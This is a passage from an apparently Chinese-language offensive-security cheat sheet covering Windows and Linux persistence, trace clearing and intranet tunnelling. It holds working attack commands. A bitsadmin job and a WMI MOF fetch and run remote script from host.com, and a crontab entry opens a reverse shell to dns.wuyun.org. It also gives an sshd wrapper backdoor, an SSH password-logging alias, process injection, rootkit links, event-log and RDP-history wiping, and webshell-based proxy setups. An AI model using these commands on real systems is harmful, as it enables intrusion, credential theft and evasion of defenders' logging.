Helper Objects </code></th></tr></thead></table><h5 id="9、AppInit-DLLs"><a href="#9、AppInit-DLLs" class="headerlink" title="9、AppInit_DLLs"></a><font style="color:#000000;">9、AppInit_DLLs</font></h5><p><font style="color:#000000;">加载User32.dll会加载的DLL</font></p><table><thead><tr><th><code>plain HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs </code></th></tr></thead></table><h5 id="10、文件关联"><a href="#10、文件关联" class="headerlink" title="10、文件关联"></a><font style="color:#000000;">10、文件关联</font></h5><table><thead><tr><th><code>plain HKEY_LOCAL_MACHINE\Software\Classes HKEY_CLASSES_ROOT </code></th></tr></thead></table><h5 id="11、bitsadmin"><a href="#11、bitsadmin" class="headerlink" title="11、bitsadmin"></a><font style="color:#000000;">11、</font><a href="http://www.liuhaihua.cn/archives/357579.html"><font style="color:#000000;">bitsadmin</font></a></h5><table><thead><tr><th><code>plain bitsadmin /create backdoor bitsadmin /addfile backdoor %comspec% %temp%\cmd.exe bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe &quot;/u /s /i:https://host.com/calc.sct scrobj.dll&quot; bitsadmin /Resume backdoor </code></th></tr></thead></table><h5 id="12、mof"><a href="#12、mof" class="headerlink" title="12、mof"></a><font style="color:#000000;">12、</font><a href="https://evi1cg.me/archives/Powershell_MOF_Backdoor.html"><font style="color:#000000;">mof</font></a></h5><table><thead><tr><th><code>plain pragma namespace(&quot;\\\\.\\root\\subscription&quot;)  instance of __EventFilter as $EventFilter &#123; EventNamespace = &quot;Root\\Cimv2&quot;; Name = &quot;filtP1&quot;; Query = &quot;Select * From __InstanceModificationEvent &quot; &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; &quot;And TargetInstance.Second = 1&quot;; QueryLanguage = &quot;WQL&quot;; &#125;;  instance of ActiveScriptEventConsumer as $Consumer &#123; Name = &quot;consP1&quot;; ScriptingEngine = &quot;JScript&quot;; ScriptText = &quot;GetObject(\&quot;script:https://host.com/test\&quot;)&quot;; &#125;;  instance of __FilterToConsumerBinding &#123; Consumer = $Consumer; Filter = $EventFilter; &#125;; </code></th></tr></thead></table><p><font style="color:#000000;">管理员执行：</font></p><table><thead><tr><th><code>plain mofcomp test.mof </code></th></tr></thead></table><h5 id="13、wmi"><a href="#13、wmi" class="headerlink" title="13、wmi"></a><font style="color:#000000;">13、</font><a href="https://3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe"><font style="color:#000000;">wmi</font></a></h5><p><font style="color:#000000;">每隔60秒执行一次notepad.exe</font></p><table><thead><tr><th><code>plain wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter CREATE Name=&quot;BotFilter82&quot;, EventNameSpace=&quot;root\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&quot;  wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer CREATE Name=&quot;BotConsumer23&quot;, ExecutablePath=&quot;C:\Windows\System32\notepad.exe&quot;,CommandLineTemplate=&quot;C:\Windows\System32\notepad.exe&quot;  wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter=&quot;__EventFilter.Name=\&quot;BotFilter82\&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=\&quot;BotConsumer23\&quot;&quot; </code></th></tr></thead></table><h5 id="14、Userland-Persistence-With-Scheduled-Tasks"><a href="#14、Userland-Persistence-With-Scheduled-Tasks" class="headerlink" title="14、Userland Persistence With Scheduled Tasks"></a><font style="color:#000000;">14、</font><a href="https://3gstudent.github.io/Userland-registry-hijacking"><font style="color:#000000;">Userland Persistence With Scheduled Tasks</font></a></h5><p><font style="color:#000000;">劫持计划任务UserTask，在系统启动时加载dll</font></p><p>| <code>plain function Invoke-ScheduledTaskComHandlerUserTask &#123; [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = &#39;Medium&#39;)] Param ( [Parameter(Mandatory = $True)] [ValidateNotNullOrEmpty()] [String] $Command,  [Switch] $Force ) $ScheduledTaskCommandPath = &quot;HKCU:\Software\Classes\CLSID\&#123;58fb76b9-ac85-4e55-ac04-427593b1d060&#125;\InprocServer32&quot; if ($Force -or ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name &#39;(default)&#39; -ErrorAction SilentlyContinue) -eq $null))&#123; New-Item $ScheduledTaskCommandPath -Force | New-ItemProperty -Name &#39;(Default)&#39; -Value $Command -PropertyType string -Force | Out-Null &#125;else&#123; Write-Verbose &quot;Key already exists, consider using -Force&quot; exit &#125;  if (Test-Path $ScheduledTaskCommandPath) &#123; Write-Verbose &quot;Created registry entries to hijack the UserTask&quot; &#125;else&#123; Write-Warning &quot;Failed to create registry key, exiting&quot; exit &#125;  &#125; Invoke-ScheduledTaskComHandlerUserTask -Command &quot;C:\test\testmsg.dll&quot; -Verbose </code>  |<br>| — |</p><h5 id="15、Netsh"><a href="#15、Netsh" class="headerlink" title="15、Netsh"></a><font style="color:#000000;">15、</font><a href="https://3gstudent.github.io/Netsh-persistence"><font style="color:#000000;">Netsh</font></a></h5><table><thead><tr><th><code>plain netsh add helper c:\test\netshtest.dll </code></th></tr></thead></table><p><font style="color:#000000;">后门触发：每次调用netsh</font></p><p><strong><font style="color:#000000;">dll编写:</font></strong><a href="https://github.com/outflanknl/NetshHelperBeacon"><font style="color:#000000;">https://github.com/outflanknl/NetshHelperBeacon</font></a></p><h5 id="16、Shim"><a href="#16、Shim" class="headerlink" title="16、Shim"></a><font style="color:#000000;">16、</font><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims"><font style="color:#000000;">Shim</font></a></h5><p><font style="color:#000000;">常用方式： InjectDll RedirectShortcut RedirectEXE</font></p><h5 id="17、DLL劫持"><a href="#17、DLL劫持" class="headerlink" title="17、DLL劫持"></a><font style="color:#000000;">17、</font><a href="https://3gstudent.github.io/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95"><font style="color:#000000;">DLL劫持</font></a></h5><p><font style="color:#000000;">通过Rattler自动枚举进程，检测是否存在可用dll劫持利用的进程 使用：Procmon半自动测试更精准，常规生成的dll会导致程序执行报错或中断，使用AheadLib配合生成dll劫持利用源码不会影响程序执行</font></p><p><font style="color:#000000;">工具：</font><a href="https://github.com/sensepost/rattler"><font style="color:#000000;">https://github.com/sensepost/rattler</font></a></p><p><font style="color:#000000;">工具：</font><a href="https://github.com/Yonsm/AheadLib"><font style="color:#000000;">https://github.com/Yonsm/AheadLib</font></a></p><p><font style="color:#000000;">dll劫持不多说</font></p><h5 id="18、DoubleAgent"><a href="#18、DoubleAgent" class="headerlink" title="18、DoubleAgent"></a><font style="color:#000000;">18、</font><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Verifier(DoubleAgent%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D)"><font style="color:#000000;">DoubleAgent</font></a></h5><p><font style="color:#000000;">编写自定义Verifier provider DLL 通过Application Verifier进行安装 注入到目标进程执行payload 每当目标进程启动，均会执行payload，相当于一个自启动的方式 POC :</font><font style="color:#000000;"> </font><a href="https://github.com/Cybellum/DoubleAgent"><font style="color:#000000;">https://github.com/Cybellum/DoubleAgent</font></a></p><h5 id="19、waitfor-exe"><a href="#19、waitfor-exe" class="headerlink" title="19、waitfor.exe"></a><font style="color:#000000;">19、</font><a href="https://3gstudent.github.io/Use-Waitfor.exe-to-maintain-persistence"><font style="color:#000000;">waitfor.exe</font></a></h5><p><font style="color:#000000;">不支持自启动，但可远程主动激活，后台进程显示为waitfor.exe POC :</font><font style="color:#000000;"> </font><a href="https://github.com/3gstudent/Waitfor-Persistence"><font style="color:#000000;">https://github.com/3gstudent/Waitfor-Persistence</font></a></p><h5 id="20、AppDomainManager"><a href="#20、AppDomainManager" class="headerlink" title="20、AppDomainManager"></a><font style="color:#000000;">20、</font><a href="https://3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence"><font style="color:#000000;">AppDomainManager</font></a></h5><p><font style="color:#000000;">针对.Net程序，通过修改AppDomainManager能够劫持.Net程序的启动过程。如果劫持了系统常见.Net程序如powershell.exe的启动过程，向其添加payload，就能实现一种被动的后门触发机制</font></p><h5 id="21、Office"><a href="#21、Office" class="headerlink" title="21、Office"></a><font style="color:#000000;">21、Office</font></h5><p><a href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91DLL%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8"><font style="color:#000000;">劫持Office软件的特定功能</font></a><font style="color:#000000;">:通过dll劫持,在Office软件执行特定功能时触发后门</font><font style="color:#000000;"> </font><a href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8VSTO%E5%AE%9E%E7%8E%B0%E7%9A%84office%E5%90%8E%E9%97%A8"><font style="color:#000000;">利用VSTO实现的office后门</font></a><font style="color:#000000;"> </font><a href="https://github.com/3gstudent/Office-Persistence"><font style="color:#000000;">Office加载项</font></a></p><ul><li><font style="color:#000000;">Word WLL</font></li><li><font style="color:#000000;">Excel XLL</font></li><li><font style="color:#000000;">Excel VBA add-ins</font></li><li><font style="color:#000000;">PowerPoint VBA add-ins</font></li></ul><p><strong><font style="color:#000000;">参考1 ：</font></strong><a href="https://3gstudent.github.io/Use-Office-to-maintain-persistence"><font style="color:#000000;">https://3gstudent.github.io/Use-Office-to-maintain-persistence</font></a></p><p><strong><font style="color:#000000;">参考2 ：</font></strong><a href="https://3gstudent.github.io/Office-Persistence-on-x64-operating-system"><font style="color:#000000;">https://3gstudent.github.io/Office-Persistence-on-x64-operating-system</font></a></p><h5 id="22、CLR"><a href="#22、CLR" class="headerlink" title="22、CLR"></a><font style="color:#000000;">22、</font><a href="https://3gstudent.github.io/Use-CLR-to-maintain-persistence"><font style="color:#000000;">CLR</font></a></h5><p><font style="color:#000000;">无需管理员权限的后门，并能够劫持所有.Net程序 POC:</font><a href="https://github.com/3gstudent/CLR-Injection"><font style="color:#000000;">https://github.com/3gstudent/CLR-Injection</font></a></p><h5 id="23、msdtc"><a href="#23、msdtc" class="headerlink" title="23、msdtc"></a><font style="color:#000000;">23、</font><a href="https://3gstudent.github.io/Use-msdtc-to-maintain-persistence"><font style="color:#000000;">msdtc</font></a></h5><p><font style="color:#000000;">利用MSDTC服务加载dll，实现自启动，并绕过Autoruns对启动项的检测 利用：向 %windir%\system32\目录添加dll并重命名为oci.dll</font></p><h5 id="24、Hijack-CAccPropServicesClass-and-MMDeviceEnumerato"><a href="#24、Hijack-CAccPropServicesClass-and-MMDeviceEnumerato" class="headerlink" title="24、Hijack CAccPropServicesClass and MMDeviceEnumerato"></a><font style="color:#000000;">24、</font><a href="https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-CAccPropServicesClass-and-MMDeviceEnumerator"><font style="color:#000000;">Hijack CAccPropServicesClass and MMDeviceEnumerato</font></a></h5><p><font style="color:#000000;">利用COM组件，不需要重启系统，不需要管理员权限 通过修改注册表实现 POC：</font><a href="https://github.com/3gstudent/COM-Object-hijacking"><font style="color:#000000;">https://github.com/3gstudent/COM-Object-hijacking</font></a></p><h5 id="25、Hijack-explorer-exe"><a href="#25、Hijack-explorer-exe" class="headerlink" title="25、Hijack explorer.exe"></a><font style="color:#000000;">25、</font><a href="https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe"><font style="color:#000000;">Hijack explorer.exe</font></a></h5><p><font style="color:#000000;">COM组件劫持，不需要重启系统，不需要管理员权限 通过修改注册表实现</font></p><table><thead><tr><th><code>plain HKCU\Software\Classes\CLSID&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125; HKCU\Software\Classes\CLSID&#123;fbeb8a05-beee-4442-804e-409d6c4515e9&#125; HKCU\Software\Classes\CLSID&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125; HKCU\Software\Classes\Wow6432Node\CLSID&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125; </code></th></tr></thead></table><h5 id="26、Windows-FAX-DLL-Injection"><a href="#26、Windows-FAX-DLL-Injection" class="headerlink" title="26、Windows FAX DLL Injection"></a><font style="color:#000000;">26、Windows FAX DLL Injection</font></h5><p><font style="color:#000000;">通过DLL劫持，劫持Explorer.exe对</font><font style="color:#000000;">fxsst.dll</font><font style="color:#000000;">的加载 Explorer.exe在启动时会加载</font><font style="color:#000000;">c:\Windows\System32\fxsst.dll</font><font style="color:#000000;">(服务默认开启，用于传真服务)将payload.dll保存在</font><font style="color:#000000;">c:\Windows\fxsst.dll</font><font style="color:#000000;">，能够实现dll劫持，劫持Explorer.exe对</font><font style="color:#000000;">fxsst.dll</font><font style="color:#000000;">的加载</font></p><h5 id="27、特殊注册表键值"><a href="#27、特殊注册表键值" class="headerlink" title="27、特殊注册表键值"></a><font style="color:#000000;">27、特殊注册表键值</font></h5><p><font style="color:#000000;">在注册表启动项创建特殊名称的注册表键值，用户正常情况下无法读取(使用Win32 API)，但系统能够执行(使用Native API)。</font></p><p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA"><font style="color:#000000;">《渗透技巧——“隐藏”注册表的创建》</font></a></p><p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E6%9B%B4%E5%A4%9A%E6%B5%8B%E8%AF%95"><font style="color:#000000;">《渗透技巧——“隐藏”注册表的更多测试》</font></a></p><h5 id="28、快捷方式后门"><a href="#28、快捷方式后门" class="headerlink" title="28、快捷方式后门"></a><font style="color:#000000;">28、快捷方式后门</font></h5><p><font style="color:#000000;">替换我的电脑快捷方式启动参数 POC :</font><font style="color:#000000;"> </font><a href="https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1"><font style="color:#000000;">https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1</font></a></p><h5 id="29、Logon-Scripts"><a href="#29、Logon-Scripts" class="headerlink" title="29、Logon Scripts"></a><font style="color:#000000;">29、</font><a href="https://3gstudent.github.io/Use-Logon-Scripts-to-maintain-persistence"><font style="color:#000000;">Logon Scripts</font></a></h5><p>| <code>plain New-ItemProperty &quot;HKCU:\Environment\&quot; UserInitMprLogonScript -value &quot;c:\test\11.bat&quot; -propertyType string | Out-Null </code>  |<br>| — |</p><h5 id="30、Password-Filter-DLL"><a href="#30、Password-Filter-DLL" class="headerlink" title="30、Password Filter DLL"></a><font style="color:#000000;">30、</font><a href="https://3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8"><font style="color:#000000;">Password Filter DLL</font></a></h5><h5 id="31、利用BHO实现IE浏览器劫持"><a href="#31、利用BHO实现IE浏览器劫持" class="headerlink" title="31、利用BHO实现IE浏览器劫持"></a><font style="color:#000000;">31、</font><a href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8BHO%E5%AE%9E%E7%8E%B0IE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81"><font style="color:#000000;">利用BHO实现IE浏览器劫持</font></a></h5><h2 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a><font style="color:#000000;">Linux</font></h2><h5 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a><font style="color:#000000;">crontab</font></h5><p><font style="color:#000000;">每60分钟反弹一次shell给dns.wuyun.org的53端口</font></p><p>| <code>plain #!bash (crontab -l;printf &quot;*/60 * * * * exec 9&lt;&gt; /dev/tcp/dns.wuyun.org/53;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;)|crontab - </code>  |<br>| — |</p><h5 id="硬链接sshd"><a href="#硬链接sshd" class="headerlink" title="硬链接sshd"></a><font style="color:#000000;">硬链接sshd</font></h5><table><thead><tr><th><code>plain #!bash ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=2333; </code></th></tr></thead></table><p><font style="color:#000000;">链接：ssh</font><font style="color:#000000;"> </font><a href="mailto:root@192.168.206.142"><font style="color:#000000;">root@192.168.206.142</font></a><font style="color:#000000;"> </font><font style="color:#000000;">-p 2333</font></p><h5 id="SSH-Server-wrapper"><a href="#SSH-Server-wrapper" class="headerlink" title="SSH Server wrapper"></a><font style="color:#000000;">SSH Server wrapper</font></h5><table><thead><tr><th><code>plain #!bash cd /usr/sbin mv sshd ../bin echo &#39;#!/usr/bin/perl&#39; &gt;sshd echo &#39;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);&#39; &gt;&gt;sshd echo &#39;exec &#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#39; &gt;&gt;sshd chmod u+x sshd //不用重启也行 /etc/init.d/sshd restart socat STDIO TCP4:192.168.206.142:22,sourceport=13377 </code></th></tr></thead></table><h5 id="SSH-keylogger"><a href="#SSH-keylogger" class="headerlink" title="SSH keylogger"></a><font style="color:#000000;">SSH keylogger</font></h5><p><font style="color:#000000;">vim当前用户下的.bashrc文件,末尾添加</font></p><table><thead><tr><th><code>plain #!bash alias ssh=&#39;strace -o /tmp/sshpwd-`date &#39;+%d%h%m%s&#39;`.log -e read,write,connect -s2048 ssh&#39; </code></th></tr></thead></table><p><font style="color:#000000;">source .bashrc</font></p><h5 id="Cymothoa-进程注入backdoor"><a href="#Cymothoa-进程注入backdoor" class="headerlink" title="Cymothoa_进程注入backdoor"></a><font style="color:#000000;">Cymothoa_进程注入backdoor</font></h5><table><thead><tr><th><code>plain ./cymothoa -p 2270 -s 1 -y 7777 nc -vv ip 7777 </code></th></tr></thead></table><h5 id="rootkit"><a href="#rootkit" class="headerlink" title="rootkit"></a><font style="color:#000000;">rootkit</font></h5><ul><li><a href="http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz"><font style="color:#000000;">openssh_rootkit</font></a></li><li><a href="http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz"><font style="color:#000000;">Kbeast_rootkit</font></a></li><li><font style="color:#000000;">Mafix + Suterusu rootkit</font></li></ul><h5 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a><font style="color:#000000;">Tools</font></h5><ul><li><a href="https://github.com/Screetsec/Vegile"><font style="color:#000000;">Vegile</font></a></li><li><a href="https://github.com/icco/backdoor"><font style="color:#000000;">backdoor</font></a></li></ul><h1 id="14-痕迹清理"><a href="#14-痕迹清理" class="headerlink" title="14.痕迹清理"></a><font style="color:#000000;">14.痕迹清理</font></h1><h3 id="Windows日志清除"><a href="#Windows日志清除" class="headerlink" title="Windows日志清除"></a><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87"><font style="color:#000000;">Windows日志清除</font></a></h3><p><font style="color:#000000;">获取日志分类列表：</font></p><table><thead><tr><th><code>plain wevtutil el &gt;1.txt </code></th></tr></thead></table><p><font style="color:#000000;">获取单个日志类别的统计信息： eg.</font></p><table><thead><tr><th><code>plain wevtutil gli &quot;windows powershell&quot; </code></th></tr></thead></table><p><font style="color:#000000;">回显：</font></p><table><thead><tr><th><code>plain creationTime: 2016-11-28T06:01:37.986Z lastAccessTime: 2016-11-28T06:01:37.986Z lastWriteTime: 2017-08-08T08:01:20.979Z fileSize: 1118208 attributes: 32 numberOfLogRecords: 1228 oldestRecordNumber: 1 </code></th></tr></thead></table><p><font style="color:#000000;">查看指定日志的具体内容：</font></p><table><thead><tr><th><code>plain wevtutil qe /f:text &quot;windows powershell&quot; </code></th></tr></thead></table><p><font style="color:#000000;">删除单个日志类别的所有信息：</font></p><table><thead><tr><th><code>plain wevtutil cl &quot;windows powershell&quot; </code></th></tr></thead></table><h3 id="破坏Windows日志记录功能"><a href="#破坏Windows日志记录功能" class="headerlink" title="破坏Windows日志记录功能"></a><u><font style="color:#000000;">破坏Windows日志记录功能</font></u></h3><p><font style="color:#000000;">利用工具</font></p><ul><li><a href="https://github.com/hlldz/Invoke-Phant0m"><font style="color:#000000;">Invoke-Phant0m</font></a></li><li><a href="https://github.com/3gstudent/Windwos-EventLog-Bypass"><font style="color:#000000;">Windwos-EventLog-Bypass</font></a></li></ul><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><u><font style="color:#000000;">Metasploit</font></u></h3><table><thead><tr><th><code>plain run clearlogs  clearev </code></th></tr></thead></table><h3 id="3389登陆记录清除"><a href="#3389登陆记录清除" class="headerlink" title="3389登陆记录清除"></a><u><font style="color:#000000;">3389登陆记录清除</font></u></h3><table><thead><tr><th><code>plain @echo off @reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; /va /f @del &quot;%USERPROFILE%\My Documents\Default.rdp&quot; /a @exit </code></th></tr></thead></table><h1 id="15-内网穿透"><a href="#15-内网穿透" class="headerlink" title="15.内网穿透"></a><font style="color:#000000;">15.内网穿透</font></h1><p><strong><font style="color:#000000;">区分正向代理与反向代理</font></strong></p><p><font style="color:#000000;">A—-b—-C</font></p><table><thead><tr><th><code>plain A去请求C,B作为代理，代替A去访问C，并将返回的结果转发给A   那么B就是正向代理 B主动与A的8888端口连接，并将A:8888的访问转发到C:80上去，并将结果转发给A,则B是反向代理 反向代理优势: 当AB之间有防火墙，不允许A连B,但是允许B连A </code></th></tr></thead></table><h4 id="0x01-场景与思路分析"><a href="#0x01-场景与思路分析" class="headerlink" title="0x01 场景与思路分析"></a><font style="color:#000000;">0x01 场景与思路分析</font></h4><h6 id="场景一：内网防火墙对出口流量没有任何端口限制"><a href="#场景一：内网防火墙对出口流量没有任何端口限制" class="headerlink" title="场景一：内网防火墙对出口流量没有任何端口限制"></a><font style="color:#000000;">场景一：内网防火墙对出口流量没有任何端口限制</font></h6><p><font style="color:#000000;">思路</font><font style="color:#000000;"> </font><strong><font style="color:#000000;">：由于防火墙对出口流量没有任何端口限制，我们的可选择的方案非常灵活，如：反弹shell</font></strong></p><h6 id="场景二：内网防火墙仅允许内网主机访问外网的特定端口（如：80-443）"><a href="#场景二：内网防火墙仅允许内网主机访问外网的特定端口（如：80-443）" class="headerlink" title="场景二：内网防火墙仅允许内网主机访问外网的特定端口（如：80, 443）"></a><font style="color:#000000;">场景二：内网防火墙仅允许内网主机访问外网的特定端口（如：80, 443）</font></h6><p><font style="color:#000000;">思路：由于防火墙仅允许部分特定外网端口可以访问，思路一仍然是反弹shell只不过目标端口改成特定端口即可；思路二则是端口转发，将内网主机的某些服务的端口转发到外网攻击主机上的防火墙允许的特定端口上，再通过连接外网主机上的本地端口来访问内网服务</font></p><p><strong><font style="color:#000000;">方法一：反弹shell可参考场景一中的方法，仅需修改目标端口为防火墙允许的特定端口即可</font></strong></p><p><strong><font style="color:#000000;">方法二：端口转发</font></strong></p><p><strong><font style="color:#000000;">方法三：SSH的动态端口转发配合proxychains来代理所有流量进一步渗透内网</font></strong></p><p><font style="color:#000000;">1.在内网主机上执行</font></p><table><thead><tr><th><code>plain ssh -f -N -R 2222:127.0.0.1:22 -p 80 root@192.168.0.230 (输入外网主机的SSH口令) </code></th></tr></thead></table><p><font style="color:#000000;">2.在外网主机上执行</font></p><table><thead><tr><th><code>plain ssh -f -N -D 127.0.0.1:8080 -p 2222 avfisher@127.0.0.1 (输入内网主机的SSH口令) </code></th></tr></thead></table><p><font style="color:#000000;">3.在外网主机上配置proxychains设置socks4代理</font></p><table><thead><tr><th><code>plain $ vim /etc/proxychains.conf [ProxyList] socks4 127.0.0.1 8080 </code></th></tr></thead></table><p><font style="color:#000000;">4.使用proxychains代理所有流量进入内网</font></p><table><thead><tr><th><code>plain proxychains nc -nv 10.0.2.5 3306 </code></th></tr></thead></table><h6 id="场景三：TCP不出网-HTTP代理"><a href="#场景三：TCP不出网-HTTP代理" class="headerlink" title="场景三：TCP不出网-HTTP代理"></a><font style="color:#000000;">场景三：TCP不出网-HTTP代理</font></h6><p><strong><font style="color:#000000;">一.reGeorg</font></strong></p><p><font style="color:#000000;">reGeorg原版：</font><a href="https://github.com/sensepost/reGeorg"><font style="color:#000000;">https://github.com/sensepost/reGeorg</font></a><font style="color:#000000;"><br></font><font style="color:#000000;">reGeorg修改版：</font><a href="https://github.com/L-codes/Neo-reGeorg"><font style="color:#000000;">https://github.com/L-codes/Neo-reGeorg</font></a></p><p><font style="color:#000000;">假设拿到的Webshell是</font><a href="http://aaa.com/shell.jsp%EF%BC%8C%E4%BB%A5%E5%8E%9F%E7%89%88reGeorg%E4%B8%BA%E4%BE%8B%E3%80%82"><font style="color:#000000;">http://aaa.com/shell.jsp，</font></a><font style="color:#000000;">以原版reGeorg为例。</font></p><p><font style="color:#000000;">上传reGeorg中的 tunnel.jsp，假设当前URL为</font><a href="http://aaa.com/tunnel.jsp"><font style="color:#000000;">http://aaa.com/tunnel.jsp</font></a></p><p><font style="color:#000000;">在本地PC运行如下命令</font></p><table><thead><tr><th><code>plain python reGeorgSocksProxy.py -p 8080 -h 0.0.0.0 -u http://aaa.com/tunnel.jsp </code></th></tr></thead></table><p><font style="color:#000000;">此时，将在本地PC的8080开启一个Socks端口，使用Proxifier即可进行代理。需要注意的是，由于这个http代理隧道比较脆弱，建议根据每个目标host单独添加规则，最好不要设置成全局代理。</font></p><p><strong><font style="color:#000000;">二.pystinger</font></strong></p><p><font style="color:#000000;">蜂刺-stinger_client</font></p><p><a href="https://github.com/FunnyWolf/pystinger"><font style="color:#000000;">pystinger</font></a></p><p><font style="color:#000000;">整体结构：</font></p><p><font style="color:#000000;">1.上传 proxy.jsp到目标Web服务器，上传stinger_server&#x2F;stinger_server.exe到目标系统。</font></p><p><font style="color:#000000;">2.使用Webshell启动stinger_server</font></p><table><thead><tr><th><code>plain Linux: chmod +x /tmp/stinger_server nohup /tmp/stinger_server&gt;/dev/null nohup.out &amp;  Windows: start D:/XXX/stinger_server.exe </code></th></tr></thead></table><p><font style="color:#000000;">3.VPS服务端启动监听</font></p><table><thead><tr><th><code>plain ./stinger_client -w http://aaa.com/proxy.jsp -l 0.0.0.0 -p 60000 </code></th></tr></thead></table><p><font style="color:#000000;">以上操作成功后，VPS会监听60000端口，接下来直接配置好Proxifier就可以访问目标内网了。</font></p><p><font style="color:#000000;">特别注意：这个代理也不是很稳定，有时候会断开(Wrong data)。遇到断开情况后，手动kill stinger_server进程 再启动，最后重启VPS服务端stinger_client即可</font></p><h6 id="场景四-TCP出网-socks代理"><a href="#场景四-TCP出网-socks代理" class="headerlink" title="场景四 TCP出网-socks代理"></a><font style="color:#000000;">场景四 TCP出网-socks代理</font></h6><p><a href="https://github.com/fatedier/frp"><font style="color:#000000;">frp</font></a></p><p><font style="color:#000000;">搭建步骤：<br></font><font style="color:#000000;">1.VPS运行服务端</font></p><table><thead><tr><th><code>plain ./frps -c frps.ini </code></th></tr></thead></table><p><font style="color:#000000;">注：建议用Screen将frp挂起到后台，Screen挂起程序参考</font><a href="https://www.jianshu.com/p/b24f597c0561"><font style="color:#000000;">用screen 在后台运行程序 - 简书</font></a></p><p><font style="color:#000000;">frps.ini内容：</font></p><table><thead><tr><th><code>plain [common] bind_port = 8080 tls_only = true tcp_mux = true privilege_token = token123 kcp_bind_port = 8080 </code></th></tr></thead></table><p><font style="color:#000000;">2.使用VPS将frpc frpc.ini上传到主机tmp目录，然后运行</font></p><table><thead><tr><th><code>plain Linux: chmod +x /tmp/frpc-x86 nohup /tmp/frpc-x86 -c /tmpfrpc.ini&gt;/dev/null nohup.out &amp;  Windows frpc -c frpc.ini </code></th></tr></thead></table><p><font style="color:#000000;">注：有时候用Webshell管理工具会上传失败或上传文件不完整，可以cd到frp目录，在vps使用</font><font style="color:#000000;"> </font><font style="color:#000000;">python -m SimpleHTTPServer 80</font><font style="color:#000000;"> </font><font style="color:#000000;">启动一个webserver，然后在客户端使用</font><font style="color:#000000;"> </font><font style="color:#000000;">curl <a href="http://vpsip/frpc">http://vpsip/frpc</a></font><font style="color:#000000;">下载文件。</font></p><p><font style="color:#000000;">以上操作成功后，VPS控制台会有输出，然后VPS会启动一个10001端口，接下来直接配置好Proxifier就可以访问目标内网了。</font></p><p><font style="color:#000000;">Proxifier使用参考：</font><a href="https://blog.csdn.net/u013600314/article/details/106276126/"><font style="color:#000000;">Proxifier Socks5 代理（内网访问、远程办公）</font></a></p><p><font style="color:#000000;">ps：frp会涉及到免杀的问题，这里推荐另一个代理工具，体积更小，可以看作是rust版本的frp</font></p><p><a href="https://github.com/editso/fuso"><font style="color:#000000;">fuso</font></a></p><h4 id="0x02-Lcx"><a href="#0x02-Lcx" class="headerlink" title="0x02 Lcx"></a><font style="color:#000000;">0x02 Lcx</font></h4><p><font 